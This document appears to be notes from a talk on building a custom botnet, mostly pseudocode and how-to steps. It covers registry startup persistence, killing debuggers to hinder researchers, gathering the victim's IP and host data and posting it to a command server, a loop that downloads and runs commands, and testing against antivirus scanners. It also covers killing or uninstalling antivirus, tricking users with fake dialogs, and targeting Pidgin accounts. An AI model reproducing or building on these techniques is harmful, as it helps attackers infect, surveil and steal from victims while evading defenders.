Bot formats:
http bots (generic webserver where controls done via web interction)
irc bot (controlled via irc, command line only)

Language:
c++ (no dependencies, efficient)
c# (ubiqutous and easier to run it with, nothing wrong with it)

Fundamental Aspects About Botnets
- patterns
- default configs
- update ability
- ability to be silent
- buyers or people are inevitably stupid

patterns in malware: 
default config: either gotta have an installer (no default password) or random password generation
update: going to be bugs, exploits
silent: problems getting infections cuz people will uninstall it

why custom botnets?
no need for updates
easy bug & security fixes
researchers start from scratch
minimize detection and classification of being called 'malicious'

Tools of the trade
virtual machines
brain
experience

Feature Check List
anti-vm
anti-sandbox
anti-debugger
startup keys
checking processes

not covered:
l33t zer0 days
advanced botnet features

How he did it:

startup method:
-move file to a new file
-modify windows registry
-now it works on startup!
-make it works on windows notify \& run

anti-debugger: (to slow down researchers)
\$process = "ImmunityDebugger.exe"
if ProcessExists(\$process) then:
    processclose(\$process)
endif

Information Gathering
\$ip = @IPAddress1 
\$name = @ComputerName
\$os = @OSVersion

Send Back Home
\$serverData = 'ip=' \& ip \& 'computer=' \& \$name \& 'os=' \& \$os
\$OHttp = ObjCreate("winhttp.winhttprequest.5.1")
\$OHttp.open("POST", "http://192.168.1.2/work/opbotnet/accept.php", False)
\$OHttp.SetRequestHeader....
\$OHttp.Send(\$serverData)

Every piece of malware has a while loop to phone back home periodically
while 1 {
    \$command = InetRead("http://192.168.1.2/work/opbotnet/command.php")
    \$process = BinaryToString(\$command)
    \$commandValue = split(\$process, ".")
    if \$commandValue[1] == "dl" then
        // download the command to execute to a certain directory
        ShellExecute(the program)
    end
    sleep 10000
}

Finally you put it on "NoDistribute" and check if any of the antiviruses already detect it.

Making it even better

Anti-anti-virus
- write a function called avcheck that checks whether anti viruses are there
- you can check the registry or you can check directories under Program files.  the latter is less malicious and the former can run into problems.
- then you can try uninstalling anti-virus or killing the process
- for admin privileges, you could pop up a magic box with the logo on it and trick the user into uninstalling it himself
- avenue of attack kind of depends on the antivirus; deleting registry first is nicer but sometimes risky


Things you can attack
-pidgin accounts
